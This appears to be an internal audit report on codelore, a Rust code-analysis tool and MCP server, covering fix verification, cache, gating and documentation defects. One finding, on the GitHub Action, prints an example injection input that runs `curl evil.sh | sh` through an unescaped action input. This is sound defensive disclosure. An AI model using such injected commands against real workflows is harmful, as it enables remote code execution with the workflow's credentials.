# Hardening cycle 5 — fix verification and fresh audit

**Anchor:** `deea354` (v0.25.1) · **Baseline:** `35f6bab` (cycle-4 anchor, v0.24.0) · **Delta:** 25 commits, 86 files, +4493/−590, spanning the v0.25.0 (`b42405f`) and v0.25.1 (`deea354`) cuts.

Audited from `git archive deea354` extracted read-only. No branch state was mutated. The workspace pins `1.96.0` via `rust-toolchain.toml` and `static.rust-lang.org` is unreachable from the audit host, so **nothing in this report rests on a `cargo` run** — every claim is anchored to source, to a re-implementation executed here, or to primary documentation, and the two residual limits — the two quantitative findings rest on Python ports of the shipped SQL rather than on the query itself, and the negotiated MCP protocol revision is source-read rather than handshake-verified — are named as such in §9.

---

## 0. What this cycle actually is

Cycle 4 shipped five High findings and six Mediums. Main then moved 25 commits, five of which exist specifically to implement those findings. So this cycle is unusually fix-verification-heavy: the first question is not "what is broken" but "did the fixes land, and did they land *whole*".

The answer is mostly yes, and the exceptions are the interesting part. Three of cycle 4's five Highs are **fully fixed** with real regression tests behind them. One is fully fixed for the surface it named. One — the ingest-witness work — is **partially fixed and introduced a worse defect than the one it closed**: it converted a silent-green failure into a *sticky misdiagnosing hard error that survives the exact remedy its own message prescribes*. That is H1, and it is the one fix to make first (§6).

The fresh audit swept the delta across seven parallel dimensions (cycle-4 fix verification; the F249 ingest-witness entry-point matrix; the rmcp 2.2→3.1 migration and the whole MCP surface; the new features in the delta; the F-item ledger and docs drift; a cross-cutting architecture/errors/exit-codes/SPA sweep; and a best-practices research pass). Ten Highs, twenty-seven Mediums, twenty-four Lows and four informational items survived adversarial validation. Roughly a third of the Highs are *new since cycle 4* rather than pre-existing, which is the expected shape for a 25-commit delta that included a feature wave — but two of them (H1, H7) are cycle-4 fixes that stopped one step short, and that pattern is worth naming out loud.

A note on severity, because the tier assignments here will look aggressive. The rule used throughout is **consumer blast radius, not code-smell elegance**. A defect that can move a `codelore check` / `diff` / `gate` exit code, an MCP verdict, or a CI outcome is High. A defect that only makes CLI output uglier is Low. A defect with no in-tree consumer is informational. A user-facing wrong number in the SPA is a correctness defect, not cosmetics. Under that rule a two-character documentation typo can be High (H9) and a 200-line refactor opportunity can be Low.

---

## 1. Verdict table

Cycle-4 findings against the v0.25.1 tree.

| Cycle-4 ID | Subject | Verdict |
|---|---|---|
| **H1** | `cut-release.sh` can declare CI green from an unrelated commit | **Fully fixed.** `cut-release.sh:516-529` adds a bounded 12×10s retry with `jq 'select(.event == "workflow_dispatch" and .headSha == "${RELEASE_SHA}")'` and a hard `die` at `:527-529`, so a run that is not this cut's own run can no longer satisfy the check. |
| **H2** | `release.yml` gates crates.io publication on a context unavailable there | **Fully fixed.** `release.yml:321-322` hoists `CRATES_IO_TOKEN` to step `env:`; `:329` guards on `github.ref_type == 'tag' && env.CRATES_IO_TOKEN != ''`. The publish *ordering* at `:332-335` is unchanged — a disclosed residual risk, filed here as M28. |
| **H3** | `BOOL_OR(is_bot)` erases a human who shares an identity with a bot | **Fully fixed for every SQL site.** `analyses/query.rs:85-112` introduces `HUMAN_ALIASES_CTE`; 13 call sites converted through one `{human_aliases}` substitution; zero `BOOL_OR(is_bot)` remain. `tests/bot_filter_pair_granularity_test.rs` is a genuine regression lock. Residue: one Rust-side canonical-level filter survives, invisible to the hygiene guard (M17). |
| **H4** | The ratchet file survives metric redefinition | **Fully fixed.** `quality_gates/ratchet.rs:47` `const RATCHET_SCHEMA: u32 = 1` is a manual metric epoch (not `CARGO_PKG_VERSION`), `:94-95` defaults it on read, `:184-193` warns and returns `Ok(None)` on mismatch. |
| **H5** | `codelore analyze` is a verdict-bearing surface with no ingest guard | **Partially fixed — and it introduced this cycle's H1.** Cycle 4 offered two fixes and recommended (b), "make the *evaluator* honest about empty input… which closes the class at one site". What shipped in `58fe7aa` was (a), the per-entry-point witness — 14 call sites. Coverage is now broad but not complete (`delta_health`, `diff`, `calibrate-defects` are unguarded — M1, M2, M24), and, more seriously, the witness runs *downstream of the cache write*, which is H1. The cycle-4 recommendation would not have had this failure mode. |
| **M2** | `base_cache_opts_digest` under-keys the diff base cache | **Fixed with residual.** `diff.rs:517-530` now folds in `CACHE_EPOCH`, `CARGO_PKG_VERSION` and the schema version — the three the finding named. But it still hand-rolls a second key covering only `min_revs` + `exclude`, where the canonical `cache.rs:46-61` folds the whole `Options`. The finding's own recommended fix ("reuse the same key-construction helper rather than hand-rolling a second one") was not taken (M16). |
| **M3** | MCP reports a skip reason that is not the reason | **Fixed.** `mcp.rs:520` `EVALUATED_HERE` and `main.rs:253` `CORPUS_PERCENTILE_SKIP_REASON` replace the wrong diagnostic. The delta also makes `check_gates` evaluate `corpus_percentile_max` for real (`mcp.rs:1011-1031`) — a genuine pass→fail flip on the MCP surface, correctly disclosed at `CHANGELOG.md:155`. |
| **M4** | `delta_code_health_min` compares two different metrics | **Fixed.** The key now names one metric consistently across both surfaces — `evaluators.rs:247-262` documents it as "a floor on the whole-repo-median delta (`projected − baseline`), the same semantics the key carries on `diff`". |
| **M5** | The `NotARepository` remedy points the user at the wrong action | **Text-only change.** The wording improved; the underlying `gix::discover` adoption the finding implied was not made (L2). |
| **M6** | The docs promise ingest-witness behaviour in seven places | **Fixed for the seven sites named** — but the docs now also over-promise in the opposite direction, since `analyze --after/--before` warns instead of failing (M2) and the dirty-tree warning is TTY-gated (M3). |
| **M7** | `codelore-lib`'s tests depend on a feature it does not declare | **Fully fixed.** `Cargo.toml:127-129` declares `test-support = ["dep:tempfile"]`, and the affected targets carry `required-features = ["test-support"]` (`:340-346` and siblings). |
| **L1** | Every SPA badge renders green | **Fixed for `.badge`.** The general hazard — the legacy unlayered `<style>` block outranking all layered author CSS — persists (L3). |
| **L2** | Stale calibration corpus (downgraded High → Low in cycle 4) | **Fixed.** |
| **L3** | Degraded-witness over-fire (downgraded High → Low in cycle 4) | **Fixed.** |
| **L4** | The mailmap differential test cannot see an email-only regression | **Fixed** — and verified here by executing `git check-mailmap` against `differential-repo.bundle` rather than reasoning about it. |
| **I1** | `SCHEMA_VERSION` is dead, stale, and tested tautologically | **Fixed.** `enrichment::SCHEMA_VERSION` is now live at `enrichment/engine.rs:16`, `:113`, `:312`, `:338`. |
| **I2** | Depth-1 non-merge clone — **refuted in cycle 4** | Stands refuted. Note that the *merge*-tip variant is real and is the trigger for this cycle's H1. |

Ingest-witness coverage, which is where cycle 4's largest fix landed, deserves its own table because the original F249 site list was incomplete.

| Entry point | Witnessed? | Note |
|---|---|---|
| `analyze` | `analyze.rs:257` | Downgraded to warn under `--after`/`--before` (M2) |
| `check` | `check.rs:111` | Discriminates shallow at `:116-128` |
| `gate` | `gate.rs:101` | |
| `explain` | `explain.rs:511` | |
| MCP × 10 tools | `mcp.rs:626/667/712/867/935/1001/1175/1256/1374/1436` | |
| MCP `delta_health` | **none** | `mcp.rs:795-796` — and memoized at `:826` (M1) |
| `diff` | **none** | `diff.rs:340-341` (M12 family) |
| `calibrate` | intentionally none | `head_only_ingest: true` — correct |
| `calibrate-defects` | **none, and unwitnessable** | `:52` `include_merges: true` (M24) |
| `facts/mod.rs:395/418` | n/a | The write path itself — this is H1 |

---

## 2. High-severity findings

### H1 — The blind-ingest fact store is written to the persistent cache *before* the witness runs, so `git fetch --unshallow` cannot clear the error it tells you to clear

This is a regression introduced by `58fe7aa`, the cycle-4 fix for F249. The fix is correct in isolation and wrong in composition.

`FactsDb::open_or_ingest_with_cache_root` (`crates/codelore-lib/src/facts/mod.rs:328-450`) computes `cache_key = SHA256(path ‖ head_sha ‖ version ‖ opts ‖ CACHE_EPOCH)`, misses, ingests (`:418`), flushes (`:420`), `sync_all`s (`:431-439`) and atomically renames into place (`:440`). Only then does the *caller* — `check.rs:111`, `gate.rs:101`, `analyze.rs:257`, `explain.rs:511` — call `db.ensure_ingest_witnessed(&head_sha)` (`facts/mod.rs:588`) and bail with exit 3 if the store contains zero commits.

The cache key carries no witness state and is deliberately independent of worktree state. So:

1. CI does `git clone --depth 1` onto a merge tip. The single available commit is a merge, `include_merges` is false, the walker yields **zero** commits.
2. `codelore check` ingests an empty store, **persists it**, then fails the witness → exit 3 with a message telling the user to fetch more history.
3. The user runs `git fetch --unshallow`. HEAD is unchanged. `head_sha` is unchanged. `opts` are unchanged. The cache key is byte-identical.
4. `codelore check` **hits the cache**, loads the zero-commit store, fails the witness again → **exit 3 on a fully healthy clone**, forever.

The remediation the tool prints is defeated by the tool's own cache. And there is no escape hatch on the affected surfaces: `--no-cache` exists only on `AnalyzeArgs` (`crates/codelore-cli/src/args.rs:590` — the sole `no_cache` field in the whole CLI). `CheckArgs`, `GateArgs` and `ExplainArgs` expose only `--cache-dir`; `McpArgs` (`args.rs:295-310`) exposes neither. `CLAUDE.md` explicitly forbids hand-deleting cache files. The user's only genuine out is `--cache-dir` pointed at a scratch path, which is documented nowhere as a recovery step.

The existing regression test does not cover this. `cli_test.rs::analyze_exits_3_on_truncated_shallow_checkout` bites — but it passes `--no-cache`, so it exercises precisely the one path where the defect cannot occur.

Three candidate minimal fixes, cheapest first:

- **Refuse the cache write when the store is empty.** Insert a `commit_count() == 0` check immediately before the rename at `:440`, returning the in-memory handle instead. Roughly five lines, mirrors the existing dirty-worktree bail at `:386-394` exactly, and needs no cache-key change.
- **Fold `repo.is_shallow()` into `cache_key`** (`cache.rs:46-61`). Correct but coarser: it re-ingests on every shallow→full transition even when the shallow ingest was fine.
- **Append a cache-bypass hint to the witness message** (`facts/mod.rs:590-597`). Necessary regardless — the current message is actively misleading — but on its own it only documents the trap rather than closing it.

Do the first, and add the third for the residual case. Bump `CACHE_EPOCH` (`cache.rs:37`, currently `"schema_v17"`) so already-poisoned caches in the wild are invalidated on upgrade; without that bump, existing victims stay stuck.

### H2 — Three remediation strings prescribe `--no-cache`, a flag the command that printed them does not have

Independent of H1 and broader than it. `facts/mod.rs` emits three user-facing remediations naming `--no-cache`: `:258` (`"re-ingest with --no-cache or upgrade/downgrade codelore"`), `:366-368` (the cache-hit-on-dirty-tree warning), and `:391` (the cache-write-skipped notice). All three fire from `FactsDb::open_or_ingest`, which is reached from `analyze`, `check`, `gate`, `explain`, `diff` and every MCP tool. The flag exists on exactly one of them (`args.rs:590`).

The `:258` case is the sharp one: it is the schema-mismatch bail, i.e. a hard error, and the prescribed remedy is unavailable on the gate surfaces. A user hitting it under `codelore check` in CI is told to run a flag that makes clap exit 2.

Fix: add `--no-cache` to `CheckArgs` / `GateArgs` / `ExplainArgs` / `DiffArgs` (they all already thread an `Options`, so this is a plumbing change, not a semantic one), or reword the three strings to name `--cache-dir <scratch>` — which every affected command *does* have. The first is better; the gate product needs a cache bypass for exactly the reasons H1 demonstrates.

### H3 — `calibrate-defects`' temporal split leaks positive labels, and the leak is large enough to move the acceptance verdict

`build_train_validation_split` (`crates/codelore-cli/src/calibrate_defects.rs:393-414`) builds positives as **one row per `SzzLink` with no path deduplication**, sorts them by fix date, and cuts 60/40. Negatives *are* deduplicated (`:404-408`) and are explicitly noted as "disjoint between the two splits so no single file's intensity vector is memorized across both" (`:385-386`). The positives get no such treatment, and the docstring at `:363-366` rationalizes this deliberately.

The problem is that `auc_for` (`crates/codelore-lib/src/defect_calibration/validate.rs:366-380`) scores each row from a **per-path constant** `[f64; 8]` intensity vector. So a path appearing in both splits is not "the same file seen twice" — it is a memorized answer key. The negatives' own comment names this exact hazard and then the positives violate it.

Ported the split and the scorer to Python and ran 60 seeds per configuration on **pure-noise intensities** (no real signal — any positive delta is leakage), comparing the shipped split against a path-disjoint counterfactual:

```
concentration                                shipped delta   appl   ovl | disjoint delta   appl
1 path × 30 links + 20 singles      (50)          +0.1256  34/60  1.00 |        +0.0045   8/60
5 paths × 6 links  + 20 singles     (50)          +0.0565  27/60  4.80 |        +0.0003   8/60
10 paths × 3 links + 20 singles     (50)          +0.0316  22/60  7.23 |        +0.0033  15/60
25 paths × 2 links +  0 singles     (50)          +0.0194  16/60 11.97 |        +0.0080  14/60
0 heavy, 50 singles (no repeats)    (50)          +0.0052  17/60  0.00 |        +0.0052  17/60
```

Clean monotone dose-response in the overlap count, and the last row — where no path repeats, so shipped and disjoint are the same algorithm — is identical, which is the control that says the harness isn't manufacturing the effect. The top row's `+0.1256` is **six times** `ACCEPTANCE_MARGIN = 0.02` (`validate.rs:322`), i.e. large enough on its own to flip a rejection into an acceptance. It independently reproduces the empirical anomaly recorded in `docs/reports/2026-07-28-hardening-cycle-3.md:290` (`+0.0029 → +0.1699`, `17 → 49`), which was observed there but not explained.

Fix: partition positives by path before the temporal cut — assign each *path* wholly to train or validation, then order by fix date within each side. About ten lines at `:412-414`. Delete the `:363-366` rationale, which is the load-bearing wrong belief. Bump `CACHE_EPOCH` so previously-tuned weights are not silently reused.

### H4 — The repo-relative code-health lens has no cohort-size floor, so a three-file language can fail a real `code_health_min` gate

Five of the eight code-health biomarkers are computed as `PERCENT_RANK() OVER (PARTITION BY lang ORDER BY …)` (`crates/codelore-lib/src/analyses/code_health.rs:425-429`: `cx_i`, `loc_i`, `nesting_i`, `nargs_i`, `bool_ops_i`). The only cohort guard anywhere in the path is `files.len() <= 1` at `:531`, whose comment correctly says "`PERCENT_RANK` is degenerate for a single-file language" — and then stops at one.

`PERCENT_RANK` is `(rank − 1) / (n − 1)`. At `n = 2` it emits exactly `{0.0, 1.0}`: the worse of two files is pinned to maximum intensity on all five biomarkers regardless of its absolute complexity. Re-implemented the scoring chain in Python:

```
cohort n =   2: worst structural_risk = 0.6591  band = RED  score = 67.0 | 2nd-worst sr = 0.0000  score = 100.0
cohort n =   3: worst structural_risk = 0.6591  band = RED  score = 67.0 | 2nd-worst sr = 0.3295  score =  83.5
cohort n = 100: worst structural_risk = 0.6591  band = RED  score = 67.0 | 2nd-worst sr = 0.6524  score =  67.4
```

The absolute-complexity inputs are identical across all three rows. A 40-line Kotlin adapter in a repo containing three Kotlin files scores 67.0 and fails `code_health_min = 70` (`quality_gates/evaluators.rs:459-467` → `check.rs:486` → exit 1). The same file in a Kotlin-majority repo scores whatever it deserves.

The asymmetry is what makes this a defect rather than a design choice: the **corpus** lens already enforces `MIN_LANG_SAMPLE = 500` (`calibration.rs:56`, applied at `:338`) *plus* a Wilson confidence interval before it will speak, and `code_health.rs:974` documents "a language pooled below `MIN_LANG_SAMPLE` is treated as absent". The repo-relative lens — the one wired to the gate — has neither. The project already knows the right answer and applies it on the lens that cannot fail a build.

Fix: raise the `:531` guard to a named `MIN_COHORT_FILES` (10 is defensible and cheap; anything below it falls back to absolute thresholds or is omitted from the gate with an explicit `"skipped"` verdict — see H7 for why that verdict needs teeth first). Document the floor next to the `MIN_LANG_SAMPLE` prose so the two lenses read as one policy.

### H5 — `action.yml` interpolates six caller-controlled inputs directly into composite `run:` bodies

`${{ }}` expands at YAML-render time, before bash ever sees the line, so the surrounding quotes are inert — they are part of the *rendered text*, not a shell quoting boundary. Six sites:

- `action.yml:60` — `VERSION="${{ inputs.version }}"`
- `action.yml:173-177` — `ANALYSIS`, `FORMAT`, `OUTPUT`, `REPO`, `EXTRA_ARGS`, each `X="${{ inputs.x }}"`

A caller passing `analysis: 'hotspots"; curl evil.sh | sh; #'` gets command execution in the action's step, with whatever token the calling workflow granted. On a `pull_request_target` workflow — the standard pattern for annotating forked PRs, which is exactly the audience `docs/github-action.md` addresses — those inputs are attacker-reachable.

Compounding it at `:184`: `EXTRA_ARRAY=($EXTRA_ARGS)` is deliberately unquoted (with a `# shellcheck disable=SC2206`) to word-split, which also glob-expands, so a bare `*` in `args` silently becomes the workspace file list.

Separately, the install step (`:33-36`, `:58-70`) curls the release tarball with `version` defaulting to `latest` and performs **no checksum verification**. That gap is notable precisely because the project already does this right elsewhere: `crates/codelore-lib/build.rs` SHA-256-pins every vendored JS asset and hard-fails the build on mismatch (§5). The action's install step is the one download in the tree that is not verified.

Fix: move all six to step `env:` and read `"$ANALYSIS"` etc. inside the script — `env:` values are passed through the environment, not spliced into source, which is the whole reason GitHub's own hardening guidance names this pattern. For `args`, either keep the split but validate against an allowlist of flag names, or switch to a newline-delimited input and `mapfile -t`. Add a `sha256sum -c` against a checksums file published alongside the release (`cut-release.sh` already builds the release assets, so it can emit one).

### H6 — `panic = "abort"` turns any panic in the long-lived MCP server into a silent connection death with no cleanup

`Cargo.toml:54` sets `panic = "abort"` in `[profile.release]`. For a batch CLI that is a defensible choice. For the `codelore mcp` server — a long-lived process holding an editor session — it means every `spawn_blocking(...).await.map_err(internal)?` `JoinError` arm across all eleven tools is **unreachable in release and reachable only in test builds**, so the error path that exists to convert a worker panic into a clean JSON-RPC error can never run in the shipped binary. The client sees a closed stdout pipe and an unexplained dead server. `catch_unwind` is inert under abort, so no library-side guard can help.

Two concrete consequences beyond the crash itself. `TempWorktree::drop` (`mcp.rs:207-230`) never runs on SIGABRT, so an aborted `delta_health` call leaves a registered worktree in the user's real `.git` (see M6, which is the same code path viewed as a read-only-claim violation). And the amplifier is in vendored code: `codelore-rca/src/node.rs:16-18` does `parser.parse(code, None).unwrap()`, `loc.rs:578` is the same shape, and `complexity/mod.rs:161-167` logs-and-proceeds on error trees — so a malformed or adversarial source blob in an analysed repo reaches an `.unwrap()` that a first-party call site would not have written.

The honest narrowing, and it matters: **first-party code is disciplined.** Across the library there are zero `panic!`/`todo!`/`unimplemented!` in non-test code, one `unreachable!`, eight non-test `.unwrap()` and five `.expect()`, and none of them were shown to be reachable from untrusted repository content. The one genuine asymmetry is `codelore-rca/src/node.rs:14-18` (unwraps the parse) against `clones/extractor.rs:36-42` (handles it). No trigger is claimed today; the finding is that the *blast radius when one is found* is a dead server with a dirty `.git`, and that the code is currently written as though it were a clean JSON-RPC error.

Fix, cheapest first: add `[profile.release-mcp]` inheriting release with `panic = "unwind"`, or simply drop `panic = "abort"` and accept the binary-size cost — measure it, because `lto = "fat"` + `codegen-units = 1` + `strip = true` are already doing most of the work. Then make the vendored `node.rs:16-18` return a `Result` to match `clones/extractor.rs`. Also consider `overflow-checks = true` in release; there is currently none anywhere in the workspace, and the statistics code does enough integer arithmetic to want it.

### H7 — A `"skipped"` gate verdict never moves an exit code, and there is no knob to make it

`grep` for `fail_on_skipped` or `treat_skipped` across the entire tree returns **zero hits**. No surface converts `"skipped"` into a non-zero exit; `check.rs` prints advisory notices for four of them (`:350`, `:353`, `:356`, `:362`) and `:579` documents that the ledger records `"skipped"` and `"degraded"` and "prints nothing" in the compact path.

The consequence is that a gate which silently stops evaluating is indistinguishable, at the exit code, from a gate that evaluated and passed. That is the failure mode CI gates exist to prevent. And the surface area is real: genuine skips remain at `gate.rs:319-333` (`delta_code_health_min`), `diff.rs:827-836` (`diff_gate_verdict`), and five sites in `check.rs` (`:733`, `:776`, `:853`, `:896`, plus the `corpus_percentile_max` branch). Cycle 4's M1 fix removed one *class* of skip by early-returning before it could be produced (`gate.rs:85-91`, `mcp.rs:1423-1426`), which is why `change_set_gate_verdict` (`evaluators.rs:366-371`) is now unreachable and the notices at `gate.rs:164-173` are dead code — but it did not address the others, and it did not give the user a policy lever.

Fix: add `fail_on_skipped: bool` (default `false`) to the gate config, honoured by `check`, `gate` and `diff`, mapping any `"skipped"` to the existing violation exit 1. Then delete the now-dead `gate.rs:164-173` notices and the unreachable `evaluators.rs:366-371` branch, which currently read as live behaviour to anyone auditing the file.

### H8 — `main_ruleset_put` PUTs the whole protect-main ruleset with no drift check

`scripts/cut-release.sh:123-155` defines `main_ruleset_put()`, which does a wholesale `gh api -X PUT repos/${REPO}/rulesets/${MAIN_RULESET_ID}` from a hardcoded heredoc listing nine required status-check contexts. It is invoked three times during a cut (`:208`, `:475`, `:485`). A PUT replaces the resource: **any rule or required context present on the live ruleset but absent from the heredoc is deleted**, silently, as a side effect of cutting a release.

The script already knows this is a hazard. `:276-312` implements a careful, well-commented, explicitly non-fatal drift check whose own comment reads: "if the LIVE ruleset was ever updated to require any context this script doesn't know about, the trap-driven restore would silently rewrite the ruleset back to this stale list — dropping the newer required checks." That check reads `${RULESET_ID}` — protect-release-tags. It never reads `${MAIN_RULESET_ID}`. The mitigation was written for one ruleset and not applied to the other, which is the more important one.

Fix: parameterize the `:276-312` block over both ruleset IDs and both expected-context lists. It is a loop over two entries; the logic is already correct. Keep it non-fatal for release-tags if you like, but make protect-main drift fatal — a release cut that silently removes a required check from `main` is worse than a release cut that stops.

### H9 — SARIF `security-severity` is documented 2.5× off, so a documented alert policy never fires

`output/sarif.rs:182` computes `let security_severity = (100.0 - row.cognitive_health) / 10.0;`, giving a `0.0–10.0` range, and derives `level` from it at `:192-196` (≥7 error, ≥4 warning, else note). The module docstring at `sarif.rs:4` agrees: `/ 10`.

Two user-facing docs say `/ 4`:

- `docs/advanced-usage.md:549` — "`security-severity = (100 − cognitive_health) / 4`"
- `docs/github-action.md:35` — "severity derived from each row's `(100 − code_health) / 4` band"

The confusion is traceable: `/4` is genuinely correct for the **hotspot score** formula (`advanced-usage.md:54` and `:100`, where the unscaled product caps at 40 and `/4` maps it to `[0, 10]`). Someone carried the divisor across to a different quantity.

Blast radius: `security-severity` is the field GitHub Code Scanning grades alerts on. A team reading `advanced-usage.md:549` and writing a policy that alerts at `security-severity >= 7.0` expects that threshold to correspond to `cognitive_health <= 72`; the shipped code puts it at `cognitive_health <= 30`. On a healthy repo that policy **never fires at all**, and it fails silently — an empty alert list is indistinguishable from a clean run. This is a two-character docs fix with a CI-outcome blast radius, which is exactly why it sits in the High tier.

Fix: change both docs to `/ 10`. While there, note that `github-action.md:35` also calls the input `code_health` where the code uses `cognitive_health`; make them agree.

### H10 — The F-item ledger has status rot in both directions

`docs/reports/deep_analysis_report.md` is the project's memory across hardening cycles, and it is now wrong in a way that costs real time — this cycle re-discovered work that was already shipped, and trusted "Fixed" on something still broken.

**Stale `Active` on shipped work:** F249, F263, F264 carry `Active` at `deep_analysis_report.md:459`, `:473`, `:474` despite being implemented in this delta. F206, F215 and F244 are the same shape.

**`Fixed` over live breakage:** F231 is the sharp one. It is marked `Fixed`, and its hygiene guard `tests/comment_hygiene_test.rs:151` walks `.rs` files only and inspects comment regions only — while two `Plan 7` markers survive in `facts/schema_v1.sql:134,136` (not a `.rs` file) and `analyze.rs:63` / `:1347` leak "Plan 9" and "Plan 5 scope" into **user-facing CLI error strings** (not comment regions). The guard is shaped so that it cannot see either class.

**Structural rot:** F231 carries `Active` at L287 *and* `Fixed` at L398. Twelve `Fixed` items are filed under the "Active Findings" heading. F238 and F245 have malformed rows; F247 and F248 are out of order. F269 and F268 conflict with `docs/reports/2026-08-02-discovery-pass-f249-f267.md:338`, and that document still asserts at L4 that "**Nothing here is implemented**" after a delta that implemented eight of its items.

The systemic cause is worth stating because it will recur: every `Fixed (Unreleased)` marker in the ledger became unbacked the moment `CHANGELOG.md`'s `[Unreleased]` section was correctly emptied at the v0.25.1 cut. The ledger encodes a status that depends on a CHANGELOG section that release cuts are supposed to drain.

Fix: (a) reconcile the ~10 known-stale rows; (b) replace `Fixed (Unreleased)` with `Fixed (vX.Y.Z)` stamped at cut time, so the status survives the drain — `cut-release.sh` already rewrites the CHANGELOG and can do this in the same pass; (c) extend `comment_hygiene_test.rs` to walk `.sql` and to scan string literals as well as comments, which closes F231 for real; (d) move the twelve `Fixed` rows out of the "Active Findings" section.

---

## 3. Medium-severity findings

**M1 — `delta_health` is the one MCP tool with no ingest witness, and it memoizes the vacuous result.** `mcp.rs:746-831` never calls `ensure_ingest_witnessed`. A zero-commit walk produces a well-formed, entirely vacuous `DeltaHealthSection` — no error, no warning, plausible-looking zeroes — which is then cached at `:826` for the lifetime of the process. An agent asking "did this change hurt code health" gets a confident "no". Add the witness at the top of the handler, before the memo lookup.

**M2 — `analyze --after/--before` downgrades a genuinely truncated checkout to a warning and exit 0.** `analyze.rs:248-258` treats a zero-commit walk as expected when a date filter is set, because a date filter legitimately can select nothing. But `repo.is_shallow()` already discriminates the two cases, and both `check.rs:116-128` and `mcp.rs:1080` use it to do so; `analyze` never calls it. The consequence in CI is specific and bad: `--format sarif` emits an empty SARIF file, and GitHub Code Scanning treats an empty result set as *resolved*, auto-closing every existing alert. Call `is_shallow()` and keep exit 3 for the shallow case.

**M3 — The dirty-worktree staleness warning is suppressed in CI by design.** `facts/mod.rs:363` gates the warning on `std::io::IsTerminal::is_terminal(&std::io::stderr()) && repo.is_worktree_dirty()`. The stated rationale (avoid an O(tracked-files) status walk on the near-O(1) cache-hit fast path) is sound, but the effect is that the one surface where nobody can eyeball the working tree — CI, agent loops, redirected stderr — is the one where the signal is deleted. The cache-*write* guard at `:386` is unconditional, so this is purely a disclosure gap, but it lands on a gate surface where the exit code has already been computed from possibly-stale HEAD-time metrics. `docs/advanced-usage.md:1074-1082` still says the warning fires "**whenever** a cache hit lands on a working tree with uncommitted changes", which is now false. Either drop the TTY gate for `check`/`gate` specifically, or fix the doc to state the gate and say what to do instead.

**M4 — Two gate evaluators report `"passed"` when they evaluated nothing.** `evaluators.rs:303-316` (`delta_code_health_min_per_file`, reached from `gate.rs:339`) returns `"passed"` when every changed file has `delta: None`. The correct witness is `report.health.deltas.iter().any(|r| r.delta.is_some())`. `no_new_cycles` (`evaluators.rs:336-345`) has the identical shape. Both should return `"skipped"` — which is only useful once H7 gives that verdict teeth, so land them together.

**M5 — The `hotspots` MCP tool bypasses the row cap that `mcp.rs:70-74` says every list tool has.** `mcp.rs:652` does not route through `resolve_row_cap` (`:79-81`, `MAX_ROW_CAP = 500`), so a client passing `limit: 4294967295` reaches `hotspots.rs:311`'s `LIMIT ?` unclamped and gets a multi-megabyte JSON text block. The module docstring at `:70-74` asserts the opposite. One-line fix; the helper already exists.

**M6 — `delta_health` writes into the user's real `.git` while the docs promise read-only tools.** `temp_worktree` (`mcp.rs:164-230`) runs `git worktree add`, twice per call (`:783-784`), against the user's actual repository. `docs/advanced-usage.md:1657` states "All tools are read-only." Registration lives in `.git/worktrees/`, and under H6's abort semantics the `Drop` cleanup can be skipped, so registrations accumulate. Fix: correct the doc claim to "no tool modifies tracked content; `delta_health` creates and removes a temporary worktree", and add a best-effort `git worktree prune` at server startup to sweep orphans from prior crashes.

**M7 — Eleven read-only tools carry zero MCP tool annotations.** None of the eleven declare `readOnlyHint`, `idempotentHint` or `openWorldHint`. Clients use these to decide what to auto-approve; without them, every CodeLore call looks potentially destructive and gets gated behind a human prompt, which defeats the point of an agent-facing server. This is *not* rmcp-migration fallout — the macro has accepted `annotations` since 2.2.0. Add `readOnlyHint: true` + `idempotentHint: true` to the ten genuine read-only tools, and **leave `delta_health` unannotated until M6 is resolved**, because today it is not read-only.

**M8 — `explain_file` reports a path typo as an internal error where its siblings report a parameter error.** `code_health` and `function_xray` call `require_tracked_path` (`mcp.rs:705`, `:915`) and return `-32602 invalid_params`. `explain_file` relies on `fact_sheet.rs:238-245` → exit 4 → `internal_error` via `map_lib_err` (`mcp.rs:62-68`), so the same user mistake surfaces as `-32603`. Agents are trained to retry a `-32603` (transient server fault) and to re-read parameters on a `-32602`; this one teaches them to retry a typo. Add the `require_tracked_path` call.

**M9 — The MCP test suite is structurally incapable of detecting protocol or error-semantics drift.** `mcp_test.rs:83` pins `"protocolVersion": "2024-11-05"` in the request and never asserts on the negotiated response version. The only initialize assertion is that `instructions` contains `"No network"` (`:94-99`). All four error-path assertions (`:683-688`, `:1025`, `:1191`, `:1214`) are disjunctions broad enough to pass under either error mapping. The only assertion with real teeth is the tool count at `:192`. Given that this cycle shipped a two-major rmcp bump, that is the wrong place to have no coverage. Add: an exact assertion on the negotiated `protocolVersion`; one exact `code` assertion per error class; and a check that every tool's declared annotations match expectation (which also locks M7 once fixed).

**M10 — Unbounded concurrent `spawn_blocking`, and no tool observes cancellation.** There is no semaphore around the blocking pool, so N concurrent tool calls become N simultaneous DuckDB ingests, each with its own spill directory. And no tool takes a `RequestContext`, so the per-request cancellation token is never read — a client that cancels a `hotspots` call on a large repo still pays for the full ingest. `memoized` (`mcp.rs:347-366`) correctly releases its `Mutex` across the compute, so concurrent identical calls all miss and all compute. Fix: a `tokio::sync::Semaphore` sized to something like `min(4, available_parallelism)`, plus threading `RequestContext` into the handlers and checking the token at ingest checkpoints.

**M11 — `[new_code].window_days` is documented as sharing one working set with effort-exposure; it does not.** `quality_gates/config.rs:218-224` says the field "Defaults to `DEFAULT_WINDOW_DAYS` — the same window the effort-exposure view uses, so both describe one working set." But `effort_exposure.rs:191` reads `opts.window_days` (the CLI `Options` value), not the gate config's. Set `[new_code].window_days = 30` and the two views diverge silently. Compounding it, `check.rs:94-101` and `args.rs:321` give `check` no `--window-days` at all, so there is no way to bring them back into agreement from the `check` surface. Fix: have the new-code evaluator and effort-exposure read one value, or delete the "one working set" claim and document the two windows as independent.

**M12 — `diff` gate violations exit 4, which the docs define as "analysis error".** `main.rs:445` calls `std::process::exit(4)` on a diff gate violation, with a comment citing "spec §6.6". `check.rs:336` and `gate.rs:289` `bail!` for the same class of outcome and land on exit 1. `docs/advanced-usage.md:1313` documents exit 4 as "Analysis error"; `:854` records the divergence without justifying it. A CI script branching on exit code cannot distinguish "your diff violated a gate" from "codelore crashed while analysing". Fix: make `diff` exit 1 for violations, or — if the divergence is genuinely intended — give it its own documented code rather than overloading the error bucket.

**M13 — The gate product has no CI front door.** `action.yml:179` hardcodes `CMD=(codelore analyze ...)`. There is no way to run `check`, `gate` or `diff` through the published action, and `docs/github-action.md` (187 lines) never mentions any of the three. The quality-gate feature set — the thing that produces exit codes CI is supposed to act on — is reachable from CI only by hand-rolling an install step. Add a `command:` input (default `analyze`) and document the gate workflow; this is probably the single highest-leverage *feature* item in this report.

